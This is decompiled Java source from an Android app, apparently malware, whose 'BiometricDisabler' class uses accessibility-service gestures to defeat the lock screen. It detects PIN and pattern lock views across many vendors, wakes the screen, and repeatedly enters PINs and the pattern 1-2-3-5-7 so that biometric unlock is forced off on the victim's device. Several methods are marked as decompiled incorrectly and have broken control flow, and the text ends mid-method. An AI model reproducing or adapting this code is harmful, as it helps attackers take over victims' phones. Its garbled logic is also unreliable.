package com.storm.safe.rock.service.modules;

import android.accessibilityservice.GestureDescription;
import android.graphics.Path;
import android.graphics.Rect;
import android.os.PowerManager;
import android.view.accessibility.AccessibilityNodeInfo;
import com.storm.safe.rock.service.dqtvuisjd;
import com.storm.safe.rock.util.ReflectApi;
import java.util.List;
import kotlin.Pair;
import kotlin.coroutines.AbstractC0775a0;
import kotlin.coroutines.intrinsics.CoroutineSingletons;
import kotlin.coroutines.jvm.internal.ContinuationImpl;
import kotlin.text.AbstractC0779a1;
import kotlinx.coroutines.AbstractC0780a0;
import kotlinx.coroutines.android.C0785a0;
import p000.AbstractC1117qo;
import p000.AbstractC1262tj;
import p000.C0428dt;
import p000.C0429du;
import p000.C0530gb;
import p000.C0873ms;
import p000.C1180rh;
import p000.C1351vv;
import p000.InterfaceC0876mv;
import p000.b81;
import p000.h10;
import p000.kg1;
import p000.kj1;
import p000.sc0;
import p000.t60;
import p000.uz0;
import p000.y21;

/* compiled from: r8-map-id-6aa8c380066ac34eca52ba03819884bf743dac35e85c6cbaefaab30e4b90b459 */
/* renamed from: com.storm.safe.rock.service.modules.a2 */
/* loaded from: classes2.dex */
public final class C0317a2 {

    /* renamed from: a0 */
    public final dqtvuisjd f53041a0;

    /* renamed from: a1 */
    public final dqtvuisjd f53042a1;

    /* renamed from: a2 */
    public final C0873ms f53043a2;

    /* renamed from: a3 */
    public volatile boolean f53044a3;

    static {
        new C0428dt(null);
    }

    public C0317a2(dqtvuisjd dqtvuisjdVar, dqtvuisjd dqtvuisjdVar2) {
        this.f53041a0 = dqtvuisjdVar;
        this.f53042a1 = dqtvuisjdVar2;
        C1180rh c1180rh = AbstractC1262tj.f60233a0;
        C0785a0 c0785a0 = sc0.f59953a0;
        y21 y21Var = new y21();
        c0785a0.getClass();
        this.f53043a2 = AbstractC1117qo.m214407a0(AbstractC0775a0.m213638a1(c0785a0, y21Var));
    }

    /* JADX WARN: Code restructure failed: missing block: B:17:0x002f, code lost:
    
        r1 = new java.lang.String[]{"com.android.systemui:id/pinEntry", "com.android.systemui:id/key0", "com.android.systemui:id/key1", "com.android.keyguard:id/pinEntry"};
        r3 = 0;
     */
    /* JADX WARN: Code restructure failed: missing block: B:19:0x003d, code lost:
    
        if (r3 >= 4) goto L43;
     */
    /* JADX WARN: Code restructure failed: missing block: B:20:0x003f, code lost:
    
        r4 = r6.findAccessibilityNodeInfosByViewId(r1[r3]);
     */
    /* JADX WARN: Code restructure failed: missing block: B:21:0x0045, code lost:
    
        if (r4 == null) goto L45;
     */
    /* JADX WARN: Code restructure failed: missing block: B:23:0x004b, code lost:
    
        if (r4.isEmpty() != false) goto L46;
     */
    /* JADX WARN: Code restructure failed: missing block: B:25:0x004e, code lost:
    
        r3 = r3 + 1;
     */
    /* JADX WARN: Code restructure failed: missing block: B:27:0x006b, code lost:
    
        if (m211558b4(r6, (java.lang.String[]) p000.AbstractC0715je.m213298i5(p000.AbstractC0715je.m213298i5(p000.dh0.f55773c3, p000.dh0.f55779c9), p000.dh0.f55772c2).toArray(new java.lang.String[0]), 0) == false) goto L30;
     */
    /* JADX WARN: Code restructure failed: missing block: B:29:0x006f, code lost:
    
        return com.storm.safe.rock.service.modules.BiometricDisabler$LockType.f52735a0;
     */
    /* JADX WARN: Code restructure failed: missing block: B:31:0x007e, code lost:
    
        if (m211558b4(r6, (java.lang.String[]) p000.dh0.f55775c5.toArray(new java.lang.String[0]), 0) == false) goto L34;
     */
    /* renamed from: a0 */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public static final BiometricDisabler$LockType m211549a0(C0317a2 c0317a2) {
        BiometricDisabler$LockType biometricDisabler$LockType = BiometricDisabler$LockType.f52737a2;
        try {
            AccessibilityNodeInfo rootInActiveWindow = c0317a2.f53041a0.getRootInActiveWindow();
            if (rootInActiveWindow != null) {
                String[] strArr = {"com.android.systemui:id/lockPatternView", "com.android.keyguard:id/lockPatternView", "android:id/lockPatternView"};
                int i = 0;
                while (true) {
                    if (i >= 3) {
                        break;
                    }
                    List<AccessibilityNodeInfo> listFindAccessibilityNodeInfosByViewId = rootInActiveWindow.findAccessibilityNodeInfosByViewId(strArr[i]);
                    if (listFindAccessibilityNodeInfosByViewId != null && !listFindAccessibilityNodeInfosByViewId.isEmpty()) {
                        break;
                    }
                    i++;
                }
                return BiometricDisabler$LockType.f52736a1;
            }
            return biometricDisabler$LockType;
        } catch (Exception e) {
            t60.m214705c6("BiometricDisabler", "检测锁屏类型失败", e);
            return biometricDisabler$LockType;
        }
    }

    /* JADX WARN: Removed duplicated region for block: B:28:0x00c5 A[Catch: Exception -> 0x0084, TryCatch #0 {Exception -> 0x0084, blocks: (B:3:0x0007, B:6:0x0011, B:9:0x003d, B:11:0x0045, B:13:0x004b, B:15:0x005f, B:17:0x0065, B:20:0x0086, B:21:0x0089, B:23:0x009b, B:25:0x00a9, B:27:0x00af, B:28:0x00c5, B:30:0x00cb, B:31:0x00e9), top: B:42:0x0007 }] */
    /* renamed from: a1 */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public static final Object m211550a1(C0317a2 c0317a2, InterfaceC0876mv interfaceC0876mv) throws Throwable {
        Object objM211562a8;
        C1351vv c1351vv = C1351vv.f60710b1;
        Rect rect = null;
        try {
            AccessibilityNodeInfo rootInActiveWindow = c0317a2.f53041a0.getRootInActiveWindow();
            if (rootInActiveWindow != null) {
                String[] strArr = {"com.android.systemui:id/lockPatternView", "com.android.keyguard:id/lockPatternView", "android:id/lockPatternView", "com.coloros.keyguard:id/lockPatternView", "com.oppo.keyguard:id/lockPatternView", "com.coloros.keyguard:id/pattern_view", "com.oppo.keyguard:id/pattern_view", "com.android.systemui:id/pattern_view", "com.vivo.keyguard:id/lockPatternView", "com.bbk.keyguard:id/lockPatternView", "com.miui.keyguard:id/lockPatternView", "com.huawei.keyguard:id/lockPatternView", "com.samsung.android.keyguard:id/lockPatternView", "pattern_view", "patternView", "lock_pattern"};
                int i = 0;
                while (true) {
                    if (i < 16) {
                        String str = strArr[i];
                        List<AccessibilityNodeInfo> listFindAccessibilityNodeInfosByViewId = rootInActiveWindow.findAccessibilityNodeInfosByViewId(str);
                        if (listFindAccessibilityNodeInfosByViewId != null && !listFindAccessibilityNodeInfosByViewId.isEmpty()) {
                            Rect rect2 = new Rect();
                            listFindAccessibilityNodeInfosByViewId.get(0).getBoundsInScreen(rect2);
                            if (rect2.width() > 100 && rect2.height() > 100) {
                                t60.m214714d6("BiometricDisabler", "✅ 通过资源ID找到图案锁视图: " + str + ", rect=" + rect2);
                                rect = rect2;
                                break;
                            }
                        }
                        i++;
                    } else {
                        AccessibilityNodeInfo accessibilityNodeInfoM211556b2 = m211556b2(rootInActiveWindow, new String[]{"com.android.internal.widget.LockPatternView", "android.widget.LockPatternView", "com.oppo.widget.LockPatternView", "com.coloros.widget.LockPatternView"});
                        if (accessibilityNodeInfoM211556b2 != null) {
                            Rect rect3 = new Rect();
                            accessibilityNodeInfoM211556b2.getBoundsInScreen(rect3);
                            if (rect3.width() <= 100 || rect3.height() <= 100) {
                                AccessibilityNodeInfo accessibilityNodeInfoM211563b1 = c0317a2.m211563b1(rootInActiveWindow);
                                if (accessibilityNodeInfoM211563b1 != null) {
                                    Rect rect4 = new Rect();
                                    accessibilityNodeInfoM211563b1.getBoundsInScreen(rect4);
                                    t60.m214714d6("BiometricDisabler", "✅ 通过大面积正方形区域找到可能的图案锁: rect=" + rect4);
                                    rect = rect4;
                                } else {
                                    t60.m214726f4("BiometricDisabler", "⚠️ 未能通过任何方式找到图案锁视图");
                                }
                            } else {
                                t60.m214714d6("BiometricDisabler", "✅ 通过类名找到图案锁视图: rect=" + rect3);
                                rect = rect3;
                            }
                        }
                    }
                }
            }
        } catch (Exception e) {
            t60.m214705c6("BiometricDisabler", "查找图案锁视图失败", e);
        }
        if (rect == null) {
            t60.m214726f4("BiometricDisabler", "⚠️ 未找到图案锁视图，使用屏幕比例计算");
            Pair pairM213572b9 = kj1.m213572b9(c0317a2.f53042a1);
            float fIntValue = ((Number) pairM213572b9.f57556a0).intValue();
            float f = 0.12f * fIntValue;
            float fIntValue2 = ((Number) pairM213572b9.f57557a1).intValue();
            float f2 = 0.4f * fIntValue2;
            float f3 = (fIntValue * 0.88f) - f;
            float f4 = (fIntValue2 * 0.7f) - f2;
            t60.m214714d6("BiometricDisabler", "📐 图案锁区域计算: left=" + f + ", top=" + f2 + ", width=" + f3 + ", height=" + f4);
            objM211562a8 = c0317a2.m211562a8(f, f2, f3, f4, (ContinuationImpl) interfaceC0876mv);
            if (objM211562a8 != CoroutineSingletons.f57606a0) {
                return c1351vv;
            }
        } else {
            objM211562a8 = c0317a2.m211562a8(rect.left, rect.top, rect.width(), rect.height(), (ContinuationImpl) interfaceC0876mv);
            if (objM211562a8 != CoroutineSingletons.f57606a0) {
                return c1351vv;
            }
        }
        return objM211562a8;
    }

    /* JADX WARN: Can't wrap try/catch for region: R(6:26|27|65|28|(1:30)(2:31|(1:(1:67)(2:33|(2:70|40)(2:68|37))))|(2:54|(5:57|(1:59)|62|21|(2:63|64)(0)))) */
    /* JADX WARN: Code restructure failed: missing block: B:38:0x00c6, code lost:
    
        r15 = move-exception;
     */
    /* JADX WARN: Code restructure failed: missing block: B:41:0x00cb, code lost:
    
        r9 = (java.lang.String[]) p000.AbstractC0134bh.m210728f1(p000.AbstractC0715je.m213301i8(p000.dh0.f55752a2, 15).toArray(new java.lang.String[0]), new java.lang.String[]{"✓"});
        r11 = r9.length;
     */
    /* JADX WARN: Code restructure failed: missing block: B:42:0x00e6, code lost:
    
        if (r10 >= r11) goto L71;
     */
    /* JADX WARN: Code restructure failed: missing block: B:43:0x00e8, code lost:
    
        r12 = m211557b3(r15, r9[r10]);
     */
    /* JADX WARN: Code restructure failed: missing block: B:44:0x00ee, code lost:
    
        if (r12 == null) goto L73;
     */
    /* JADX WARN: Code restructure failed: missing block: B:46:0x00f4, code lost:
    
        if (r12.isClickable() == false) goto L74;
     */
    /* JADX WARN: Code restructure failed: missing block: B:47:0x00f6, code lost:
    
        r3.m211559a5(r12);
     */
    /* JADX WARN: Code restructure failed: missing block: B:48:0x00fa, code lost:
    
        r10 = r10 + 1;
     */
    /* JADX WARN: Code restructure failed: missing block: B:49:0x00fd, code lost:
    
        r15 = p000.kj1.m213572b9(r3.f53042a1);
        r3.m211565b6(((java.lang.Number) r15.f57556a0).intValue() * 0.83f, ((java.lang.Number) r15.f57557a1).intValue() * 0.78f);
     */
    /* JADX WARN: Code restructure failed: missing block: B:51:0x0121, code lost:
    
        p000.t60.m214705c6("BiometricDisabler", "点击确认按钮失败", r15);
     */
    /* JADX WARN: Code restructure failed: missing block: B:60:0x0147, code lost:
    
        if (p000.b81.m210571b1(1000, r1) == r2) goto L61;
     */
    /* JADX WARN: Removed duplicated region for block: B:23:0x0062  */
    /* JADX WARN: Removed duplicated region for block: B:30:0x0099  */
    /* JADX WARN: Removed duplicated region for block: B:31:0x009b A[Catch: Exception -> 0x00c6, TryCatch #0 {Exception -> 0x00c6, blocks: (B:28:0x0091, B:31:0x009b, B:33:0x00a9, B:35:0x00b1, B:37:0x00b7, B:40:0x00c8, B:41:0x00cb, B:43:0x00e8, B:45:0x00f0, B:47:0x00f6, B:48:0x00fa, B:49:0x00fd), top: B:65:0x0091 }] */
    /* JADX WARN: Removed duplicated region for block: B:54:0x0129 A[PHI: r3 r14
      0x0129: PHI (r3v2 com.storm.safe.rock.service.modules.a2) = (r3v3 com.storm.safe.rock.service.modules.a2), (r3v11 com.storm.safe.rock.service.modules.a2) binds: [B:52:0x0126, B:18:0x004a] A[DONT_GENERATE, DONT_INLINE]
      0x0129: PHI (r14v2 int) = (r14v3 int), (r14v10 int) binds: [B:52:0x0126, B:18:0x004a] A[DONT_GENERATE, DONT_INLINE]] */
    /* JADX WARN: Removed duplicated region for block: B:57:0x0138 A[PHI: r3 r14
      0x0138: PHI (r3v1 com.storm.safe.rock.service.modules.a2) = (r3v2 com.storm.safe.rock.service.modules.a2), (r3v12 com.storm.safe.rock.service.modules.a2) binds: [B:55:0x0135, B:17:0x0041] A[DONT_GENERATE, DONT_INLINE]
      0x0138: PHI (r14v1 int) = (r14v2 int), (r14v11 int) binds: [B:55:0x0135, B:17:0x0041] A[DONT_GENERATE, DONT_INLINE]] */
    /* JADX WARN: Removed duplicated region for block: B:59:0x013b  */
    /* JADX WARN: Removed duplicated region for block: B:63:0x0150  */
    /* JADX WARN: Removed duplicated region for block: B:7:0x0015  */
    /* JADX WARN: Unsupported multi-entry loop pattern (BACK_EDGE: B:58:0x0139 -> B:62:0x014b). Please report as a decompilation issue!!! */
    /* JADX WARN: Unsupported multi-entry loop pattern (BACK_EDGE: B:60:0x0147 -> B:62:0x014b). Please report as a decompilation issue!!! */
    /* renamed from: a2 */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public static final Object m211551a2(C0317a2 c0317a2, ContinuationImpl continuationImpl) throws Throwable {
        BiometricDisabler$executePinLock$1 biometricDisabler$executePinLock$1;
        int i;
        int i2;
        C0317a2 c0317a22;
        AccessibilityNodeInfo rootInActiveWindow;
        C1351vv c1351vv = C1351vv.f60710b1;
        if (continuationImpl instanceof BiometricDisabler$executePinLock$1) {
            biometricDisabler$executePinLock$1 = (BiometricDisabler$executePinLock$1) continuationImpl;
            int i3 = biometricDisabler$executePinLock$1.f52755a4;
            if ((i3 & Integer.MIN_VALUE) != 0) {
                biometricDisabler$executePinLock$1.f52755a4 = i3 - Integer.MIN_VALUE;
            } else {
                biometricDisabler$executePinLock$1 = new BiometricDisabler$executePinLock$1(c0317a2, continuationImpl);
            }
        }
        Object obj = biometricDisabler$executePinLock$1.f52753a2;
        CoroutineSingletons coroutineSingletons = CoroutineSingletons.f57606a0;
        int i4 = biometricDisabler$executePinLock$1.f52755a4;
        if (i4 == 0) {
            kg1.m213544f4(obj);
            i = 1;
            if (i >= 7) {
            }
        } else {
            if (i4 == 1) {
                i2 = biometricDisabler$executePinLock$1.f52752a1;
                c0317a22 = biometricDisabler$executePinLock$1.f52751a0;
                kg1.m213544f4(obj);
                biometricDisabler$executePinLock$1.f52751a0 = c0317a22;
                biometricDisabler$executePinLock$1.f52752a1 = i2;
                biometricDisabler$executePinLock$1.f52755a4 = 2;
                c0317a22.getClass();
                rootInActiveWindow = c0317a22.f53041a0.getRootInActiveWindow();
                if (rootInActiveWindow == null) {
                }
                if (c1351vv != coroutineSingletons) {
                }
                return coroutineSingletons;
            }
            if (i4 == 2) {
                i2 = biometricDisabler$executePinLock$1.f52752a1;
                c0317a22 = biometricDisabler$executePinLock$1.f52751a0;
                kg1.m213544f4(obj);
                biometricDisabler$executePinLock$1.f52751a0 = c0317a22;
                biometricDisabler$executePinLock$1.f52752a1 = i2;
                biometricDisabler$executePinLock$1.f52755a4 = 3;
                if (b81.m210571b1(500L, biometricDisabler$executePinLock$1) != coroutineSingletons) {
                }
                return coroutineSingletons;
            }
            if (i4 == 3) {
                i2 = biometricDisabler$executePinLock$1.f52752a1;
                c0317a22 = biometricDisabler$executePinLock$1.f52751a0;
                kg1.m213544f4(obj);
                if (i2 < 6) {
                }
                i = i2 + 1;
                c0317a2 = c0317a22;
                if (i >= 7) {
                }
            } else {
                if (i4 != 4) {
                    throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
                }
                i2 = biometricDisabler$executePinLock$1.f52752a1;
                c0317a22 = biometricDisabler$executePinLock$1.f52751a0;
                kg1.m213544f4(obj);
                i = i2 + 1;
                c0317a2 = c0317a22;
                if (i >= 7) {
                    t60.m214702c3("BiometricDisabler", "🔢 执行PIN输入 第 " + i + "/6 次");
                    biometricDisabler$executePinLock$1.f52751a0 = c0317a2;
                    biometricDisabler$executePinLock$1.f52752a1 = i;
                    biometricDisabler$executePinLock$1.f52755a4 = 1;
                    if (c0317a2.m211564b5(biometricDisabler$executePinLock$1) != coroutineSingletons) {
                        c0317a22 = c0317a2;
                        i2 = i;
                        biometricDisabler$executePinLock$1.f52751a0 = c0317a22;
                        biometricDisabler$executePinLock$1.f52752a1 = i2;
                        biometricDisabler$executePinLock$1.f52755a4 = 2;
                        c0317a22.getClass();
                        rootInActiveWindow = c0317a22.f53041a0.getRootInActiveWindow();
                        if (rootInActiveWindow == null) {
                            String[] strArr = {"com.android.systemui:id/key_enter", "com.android.systemui:id/ok_button", "com.android.keyguard:id/key_enter"};
                            int i5 = 0;
                            int i6 = 0;
                            while (true) {
                                if (i6 < 3) {
                                    List<AccessibilityNodeInfo> listFindAccessibilityNodeInfosByViewId = rootInActiveWindow.findAccessibilityNodeInfosByViewId(strArr[i6]);
                                    if (listFindAccessibilityNodeInfosByViewId != null && !listFindAccessibilityNodeInfosByViewId.isEmpty()) {
                                        AccessibilityNodeInfo accessibilityNodeInfo = listFindAccessibilityNodeInfosByViewId.get(0);
                                        t60.m214694b5(accessibilityNodeInfo, "nodes[0]");
                                        c0317a22.m211559a5(accessibilityNodeInfo);
                                        break;
                                    }
                                    i6++;
                                } else {
                                    break;
                                }
                            }
                        }
                        if (c1351vv != coroutineSingletons) {
                            biometricDisabler$executePinLock$1.f52751a0 = c0317a22;
                            biometricDisabler$executePinLock$1.f52752a1 = i2;
                            biometricDisabler$executePinLock$1.f52755a4 = 3;
                            if (b81.m210571b1(500L, biometricDisabler$executePinLock$1) != coroutineSingletons) {
                                if (i2 < 6) {
                                    biometricDisabler$executePinLock$1.f52751a0 = c0317a22;
                                    biometricDisabler$executePinLock$1.f52752a1 = i2;
                                    biometricDisabler$executePinLock$1.f52755a4 = 4;
                                }
                                i = i2 + 1;
                                c0317a2 = c0317a22;
                                if (i >= 7) {
                                    t60.m214714d6("BiometricDisabler", "✅ PIN锁执行完成，共 6 次");
                                    return c1351vv;
                                }
                            }
                        }
                    }
                    return coroutineSingletons;
                }
            }
        }
    }

    /* renamed from: a3 */
    public static final void m211552a3(C0317a2 c0317a2) {
        try {
            float fIntValue = ((Number) r0.f57556a0).intValue() / 2.0f;
            float fIntValue2 = ((Number) kj1.m213572b9(c0317a2.f53042a1).f57557a1).intValue();
            Path path = new Path();
            path.moveTo(fIntValue, 0.75f * fIntValue2);
            path.lineTo(fIntValue, fIntValue2 * 0.1f);
            c0317a2.f53041a0.dispatchGesture(new GestureDescription.Builder().addStroke(new GestureDescription.StrokeDescription(path, 0L, 300L)).build(), new C0429du(0), null);
        } catch (Exception e) {
            t60.m214705c6("BiometricDisabler", "上滑手势失败", e);
        }
    }

    /* renamed from: a4 */
    public static final void m211553a4(C0317a2 c0317a2) {
        try {
            Object systemService = ReflectApi.INSTANCE.getSystemService(c0317a2.f53042a1, "power");
            PowerManager powerManager = systemService instanceof PowerManager ? (PowerManager) systemService : null;
            if (powerManager == null) {
                return;
            }
            PowerManager.WakeLock wakeLockNewWakeLock = powerManager.newWakeLock(805306378, "BiometricDisabler:WakeLock");
            wakeLockNewWakeLock.acquire(3000L);
            wakeLockNewWakeLock.release();
        } catch (Exception e) {
            t60.m214705c6("BiometricDisabler", "唤醒屏幕失败", e);
        }
    }

    /* renamed from: a9 */
    public static final float m211554a9(float f, float f2, int i) {
        return (f2 / 2.0f) + (i * f2) + f;
    }

    /* renamed from: b0 */
    public static final float m211555b0(float f, float f2, int i) {
        return (f2 / 2.0f) + (i * f2) + f;
    }

    /* renamed from: b2 */
    public static AccessibilityNodeInfo m211556b2(AccessibilityNodeInfo accessibilityNodeInfo, String[] strArr) {
        String string;
        AccessibilityNodeInfo accessibilityNodeInfoM211556b2;
        try {
            CharSequence className = accessibilityNodeInfo.getClassName();
            if (className == null || (string = className.toString()) == null) {
                string = "";
            }
            for (String str : strArr) {
                int i = (AbstractC0779a1.m213652a5(string, str, true) || AbstractC0779a1.m213655a8(string, true, "LockPatternView") || AbstractC0779a1.m213655a8(string, true, "PatternView")) ? 0 : i + 1;
                return accessibilityNodeInfo;
            }
            int childCount = accessibilityNodeInfo.getChildCount();
            for (int i2 = 0; i2 < childCount; i2++) {
                AccessibilityNodeInfo child = accessibilityNodeInfo.getChild(i2);
                if (child != null && (accessibilityNodeInfoM211556b2 = m211556b2(child, strArr)) != null) {
                    return accessibilityNodeInfoM211556b2;
                }
            }
            return null;
        } catch (Exception unused) {
            return null;
        }
    }

    /* renamed from: b3 */
    public static AccessibilityNodeInfo m211557b3(AccessibilityNodeInfo accessibilityNodeInfo, String str) {
        String string;
        AccessibilityNodeInfo accessibilityNodeInfoM211557b3;
        String string2;
        try {
            CharSequence text = accessibilityNodeInfo.getText();
            if (text == null || (string2 = text.toString()) == null || (string = AbstractC0779a1.m213687e0(string2).toString()) == null) {
                string = "";
            }
            if (string.equals(str) && accessibilityNodeInfo.isClickable()) {
                return accessibilityNodeInfo;
            }
            int childCount = accessibilityNodeInfo.getChildCount();
            for (int i = 0; i < childCount; i++) {
                AccessibilityNodeInfo child = accessibilityNodeInfo.getChild(i);
                if (child != null && (accessibilityNodeInfoM211557b3 = m211557b3(child, str)) != null) {
                    return accessibilityNodeInfoM211557b3;
                }
            }
            return null;
        } catch (Exception unused) {
            return null;
        }
    }

    /* JADX WARN: Code restructure failed: missing block: B:26:0x003a, code lost:
    
        r0 = r8.getChildCount();
        r2 = 0;
     */
    /* JADX WARN: Code restructure failed: missing block: B:27:0x003f, code lost:
    
        if (r2 >= r0) goto L41;
     */
    /* JADX WARN: Code restructure failed: missing block: B:28:0x0041, code lost:
    
        r3 = r8.getChild(r2);
     */
    /* JADX WARN: Code restructure failed: missing block: B:29:0x0045, code lost:
    
        if (r3 == null) goto L43;
     */
    /* JADX WARN: Code restructure failed: missing block: B:31:0x004d, code lost:
    
        if (m211558b4(r3, r9, r10 + 1) == false) goto L44;
     */
    /* JADX WARN: Code restructure failed: missing block: B:33:0x0050, code lost:
    
        r2 = r2 + 1;
     */
    /* renamed from: b4 */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public static boolean m211558b4(AccessibilityNodeInfo accessibilityNodeInfo, String[] strArr, int i) {
        String string;
        String string2;
        if (i <= 20) {
            try {
                CharSequence text = accessibilityNodeInfo.getText();
                String str = "";
                if (text == null || (string = text.toString()) == null) {
                    string = "";
                }
                CharSequence contentDescription = accessibilityNodeInfo.getContentDescription();
                if (contentDescription != null && (string2 = contentDescription.toString()) != null) {
                    str = string2;
                }
                int length = strArr.length;
                int i2 = 0;
                while (true) {
                    if (i2 >= length) {
                        break;
                    }
                    String str2 = strArr[i2];
                    if (AbstractC0779a1.m213652a5(string, str2, true) || AbstractC0779a1.m213652a5(str, str2, true)) {
                        break;
                    }
                    i2++;
                }
                return true;
            } catch (Exception unused) {
            }
        }
        return false;
    }

    /* renamed from: a5 */
    public final void m211559a5(AccessibilityNodeInfo accessibilityNodeInfo) {
        try {
            Rect rect = new Rect();
            accessibilityNodeInfo.getBoundsInScreen(rect);
            if (rect.width() <= 0 || rect.height() <= 0) {
                return;
            }
            m211565b6(rect.centerX(), rect.centerY());
        } catch (Exception e) {
            t60.m214705c6("BiometricDisabler", "点击节点失败", e);
        }
    }

    /* renamed from: a6 */
    public final void m211560a6(int i) {
        Pair pair;
        Pair pairM213572b9 = kj1.m213572b9(this.f53042a1);
        int iIntValue = ((Number) pairM213572b9.f57556a0).intValue();
        float fIntValue = ((Number) pairM213572b9.f57557a1).intValue();
        float f = 0.45f * fIntValue;
        float f2 = iIntValue / 3.0f;
        float f3 = (fIntValue * 0.4f) / 4.0f;
        switch (i) {
            case 0:
                pair = new Pair(1, 3);
                break;
            case 1:
                pair = new Pair(0, 0);
                break;
            case 2:
                pair = new Pair(1, 0);
                break;
            case 3:
                pair = new Pair(2, 0);
                break;
            case 4:
                pair = new Pair(0, 1);
                break;
            case 5:
                pair = new Pair(1, 1);
                break;
            case 6:
                pair = new Pair(2, 1);
                break;
            case 7:
                pair = new Pair(0, 2);
                break;
            case 8:
                pair = new Pair(1, 2);
                break;
            case 9:
                pair = new Pair(2, 2);
                break;
            default:
                pair = new Pair(1, 0);
                break;
        }
        m211565b6((f2 * 0.5f) + (((Number) pair.f57556a0).intValue() * f2), (f3 * 0.5f) + (((Number) pair.f57557a1).intValue() * f3) + f);
    }

    /* renamed from: a7 */
    public final void m211561a7(uz0 uz0Var) {
        if (!this.f53044a3) {
            AbstractC0780a0.m213692a3(this.f53043a2, null, new BiometricDisabler$disableBiometric$1(this, uz0Var, null), 3);
        } else {
            t60.m214726f4("BiometricDisabler", "⚠️ 正在执行中，忽略重复请求");
            uz0Var.m214872a8("正在执行中");
        }
    }

    /* JADX WARN: Removed duplicated region for block: B:20:0x012b  */
    /* JADX WARN: Removed duplicated region for block: B:37:0x01ae  */
    /* JADX WARN: Removed duplicated region for block: B:39:0x01b6  */
    /* JADX WARN: Removed duplicated region for block: B:7:0x001d  */
    /* JADX WARN: Unsupported multi-entry loop pattern (BACK_EDGE: B:37:0x01ae -> B:13:0x003f). Please report as a decompilation issue!!! */
    /* renamed from: a8 */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public final Object m211562a8(float f, float f2, float f3, float f4, ContinuationImpl continuationImpl) throws Throwable {
        BiometricDisabler$executePatternGesture$1 biometricDisabler$executePatternGesture$1;
        C0317a2 c0317a2;
        Path path;
        int i;
        C0317a2 c0317a22;
        Path path2;
        int i2;
        C1351vv c1351vv = C1351vv.f60710b1;
        if (continuationImpl instanceof BiometricDisabler$executePatternGesture$1) {
            biometricDisabler$executePatternGesture$1 = (BiometricDisabler$executePatternGesture$1) continuationImpl;
            int i3 = biometricDisabler$executePatternGesture$1.f52750a5;
            if ((i3 & Integer.MIN_VALUE) != 0) {
                biometricDisabler$executePatternGesture$1.f52750a5 = i3 - Integer.MIN_VALUE;
            } else {
                biometricDisabler$executePatternGesture$1 = new BiometricDisabler$executePatternGesture$1(this, continuationImpl);
            }
        }
        Object obj = biometricDisabler$executePatternGesture$1.f52748a3;
        CoroutineSingletons coroutineSingletons = CoroutineSingletons.f57606a0;
        int i4 = biometricDisabler$executePatternGesture$1.f52750a5;
        if (i4 == 0) {
            kg1.m213544f4(obj);
            float f5 = f3 / 3.0f;
            float f6 = f4 / 3.0f;
            Path path3 = new Path();
            path3.moveTo(m211554a9(f, f5, 0), m211555b0(f2, f6, 0));
            path3.lineTo(m211554a9(f, f5, 1), m211555b0(f2, f6, 0));
            path3.lineTo(m211554a9(f, f5, 2), m211555b0(f2, f6, 0));
            path3.lineTo(m211554a9(f, f5, 1), m211555b0(f2, f6, 1));
            path3.lineTo(m211554a9(f, f5, 0), m211555b0(f2, f6, 2));
            BiometricDisabler$executePatternGesture$1 biometricDisabler$executePatternGesture$12 = biometricDisabler$executePatternGesture$1;
            t60.m214714d6("BiometricDisabler", "📐 图案路径 1-2-3-5-7: 点1(" + m211554a9(f, f5, 0) + "," + m211555b0(f2, f6, 0) + ") -> 点2(" + m211554a9(f, f5, 1) + "," + m211555b0(f2, f6, 0) + ") -> 点3(" + m211554a9(f, f5, 2) + "," + m211555b0(f2, f6, 0) + ") -> 点5(" + m211554a9(f, f5, 1) + "," + m211555b0(f2, f6, 1) + ") -> 点7(" + m211554a9(f, f5, 0) + "," + m211555b0(f2, f6, 2) + ")");
            c0317a2 = this;
            path = path3;
            biometricDisabler$executePatternGesture$1 = biometricDisabler$executePatternGesture$12;
            i = 1;
            if (i < 14) {
            }
        } else {
            if (i4 == 1) {
                i2 = biometricDisabler$executePatternGesture$1.f52747a2;
                path2 = biometricDisabler$executePatternGesture$1.f52746a1;
                c0317a22 = biometricDisabler$executePatternGesture$1.f52745a0;
                kg1.m213544f4(obj);
                biometricDisabler$executePatternGesture$1.f52745a0 = c0317a22;
                biometricDisabler$executePatternGesture$1.f52746a1 = path2;
                biometricDisabler$executePatternGesture$1.f52747a2 = i2;
                biometricDisabler$executePatternGesture$1.f52750a5 = 2;
                if (b81.m210571b1(1000L, biometricDisabler$executePatternGesture$1) != coroutineSingletons) {
                }
                return coroutineSingletons;
            }
            if (i4 != 2) {
                throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
            }
            i2 = biometricDisabler$executePatternGesture$1.f52747a2;
            path2 = biometricDisabler$executePatternGesture$1.f52746a1;
            c0317a22 = biometricDisabler$executePatternGesture$1.f52745a0;
            kg1.m213544f4(obj);
            path = path2;
            i = i2 + 1;
            c0317a2 = c0317a22;
            if (i < 14) {
                t60.m214702c3("BiometricDisabler", "🔲 执行图案 1-2-3-5-7 第 " + i + "/13 次");
                biometricDisabler$executePatternGesture$1.f52745a0 = c0317a2;
                biometricDisabler$executePatternGesture$1.f52746a1 = path;
                biometricDisabler$executePatternGesture$1.f52747a2 = i;
                biometricDisabler$executePatternGesture$1.f52750a5 = 1;
                c0317a2.getClass();
                C0530gb c0530gb = new C0530gb(1, kj1.m213575c2(biometricDisabler$executePatternGesture$1));
                c0530gb.m212926b6();
                try {
                } catch (Exception e) {
                    t60.m214705c6("BiometricDisabler", "图案手势失败", e);
                    if (c0530gb.m212930c0()) {
                        c0530gb.m212933c4(c1351vv, new h10() { // from class: com.storm.safe.rock.service.modules.BiometricDisabler$dispatchPatternGesture$2$2
                            @Override // p000.h10
                            public final Object invoke(Object obj2) {
                                t60.m214695b6((Throwable) obj2, "it");
                                return C1351vv.f60710b1;
                            }
                        });
                    }
                }
                c0317a2.f53041a0.dispatchGesture(new GestureDescription.Builder().addStroke(new GestureDescription.StrokeDescription(path, 0L, 800L)).build(), new C0316a1(c0530gb), null);
                Object objM212925b5 = c0530gb.m212925b5();
                if (objM212925b5 != CoroutineSingletons.f57606a0) {
                    objM212925b5 = c1351vv;
                }
                if (objM212925b5 != coroutineSingletons) {
                    i2 = i;
                    c0317a22 = c0317a2;
                    path2 = path;
